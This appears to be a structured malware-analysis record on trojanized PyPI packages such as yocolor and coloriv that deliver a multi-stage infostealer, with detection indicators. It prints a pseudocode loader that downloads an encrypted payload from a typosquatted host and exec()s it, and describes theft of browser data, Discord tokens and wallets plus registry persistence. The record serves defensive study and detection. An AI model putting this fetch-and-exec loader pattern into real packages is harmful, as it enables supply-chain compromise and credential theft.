package_info.package_name: yocolor (and related packages: coloriv, colors-it, pylo-color, type-color, etc.)
package_info.package_versions: yocolor: 0.4.6, coloriv: 3.2, colors-it: 2.1.3, pylo-color: 1.0.3, type-color: 0.4, and others listed in the table
package_info.why_malicious: These packages were intentionally crafted or trojanized to deliver multi-stage infostealer malware. They use deceptive tactics such as typosquatting, fake infrastructure, and hijacked maintainer accounts to distribute code that exfiltrates sensitive data, establishes persistence, and enables further compromise.

execution_context.trigger: import-time or runtime (when the package is imported or executed as part of a dependency chain)
execution_context.file_location: Injected into __init__.py or main module of the malicious PyPI package (e.g., yocolor, coloriv, etc.)

malicious_snippets.code_behavior: At import-time or runtime, the code downloads and executes a remote Python loader script from a typosquatted domain, enabling remote code execution and further payload delivery.

malice_analysis.why_suspicious: Dynamic code execution from a remote, non-standard domain is a hallmark of malware loaders.
malice_analysis.violated_expectations: Legitimate packages should not fetch and execute code from external, untrusted sources at import or runtime.
malice_analysis.similar_legitimate_use: Some legitimate updaters or plugin systems may fetch code, but only from trusted, official domains and with user consent.
key_indicators: Use of exec() on remote content
No user interaction or consent required

execution_context.file_location: Loader script fetched from files[.]pypihosted[.]org (not present in original package, but delivered as next stage)

malicious_snippets.code_snippet:
# Pseudocode for loader
import requests, base64
payload = requests.get('http://files.pypihosted[.]org/final_payload.enc').content
decrypted = decrypt(payload, key)
exec(decrypted)
malicious_snippets.code_behavior: After initial compromise, the loader fetches an encrypted payload, decrypts it, and executes it in memory, enabling stealthy delivery of the main infostealer.

malice_analysis.why_suspicious: Encrypted payload delivery and in-memory execution are common anti-analysis and anti-detection techniques.
malice_analysis.violated_expectations: Legitimate software rarely downloads and executes encrypted code from untrusted sources.
malice_analysis.similar_legitimate_use: Some security tools or updaters may use encrypted payloads, but only from trusted infrastructure.
key_indicators: Encrypted payload fetched from non-standard domain

execution_context.file_location: In-memory or dropped to disk by loader

malicious_snippets.code_behavior: At runtime, the code steals browser data, Discord/Telegram tokens, cryptocurrency wallets, files matching keywords, and keystrokes, then uploads all data to attacker-controlled servers and establishes persistence via the Windows Registry.

malice_analysis.why_suspicious: Bulk data theft, credential exfiltration, and persistence mechanisms are classic infostealer behaviors.
malice_analysis.violated_expectations: Legitimate packages should not access or exfiltrate user data, credentials, or modify system persistence.
malice_analysis.similar_legitimate_use: Enterprise backup or migration tools may access similar data, but with user consent and no exfiltration to untrusted servers.

attack_chain.action: Malicious package is installed or imported, triggering initial loader code.
Loader script downloads and executes encrypted final payload.
Infostealer collects sensitive data (browser, Discord, wallets, files, keystrokes) and uploads to attacker infrastructure. Establishes persistence.
attack_chain.leads_to: Ongoing data exfiltration and system compromise

behavioral_signatures: Python packages executing code from remote, non-standard domains at import or runtime
Use of exec() or eval() on network-fetched content
Encrypted payload delivery and in-memory execution
Access to browser, Discord, Telegram, and crypto wallet data
Keystroke logging and registry modification for persistence
file_indicators: References to files[.]pypihosted[.]org or other typosquatted domains
Unexpected modifications to __init__.py or main module files
network_indicators: Uploads to attacker-controlled servers or anonymous file-sharing services (GoFile, Anonfiles)
Outbound connections carrying hardware IDs or IP addresses
detection_knowledge.how_to_detect: Monitor for Python packages that fetch and execute code from non-standard or typosquatted domains, especially at import or runtime. Flag use of exec() on network-fetched content. Detect access to browser, Discord, Telegram, and crypto wallet data by non-browser processes. Watch for registry modifications for persistence and outbound HTTP uploads to suspicious infrastructure.
